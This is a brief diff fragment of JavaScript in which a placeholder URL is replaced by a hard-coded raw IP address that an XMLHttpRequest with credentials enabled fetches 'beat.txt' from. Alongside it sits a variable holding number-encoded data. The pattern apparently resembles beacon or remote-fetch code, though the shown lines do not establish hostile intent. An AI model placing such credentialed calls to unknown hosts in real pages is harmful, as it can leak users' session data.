@@ -16,7 +16,7 @@ var data = "64,65,";
 var xhr = new XMLHttpRequest(); 
 xhr.withCredentials = true;
 
-xhr.open('GET', 'http://(IP)/test/test.txt', false);
+xhr.open('GET', 'http://202.13.168.60/beat.txt', false);
 
 xhr.onload = function(e) {
   if (xhr.readyState === 4) {
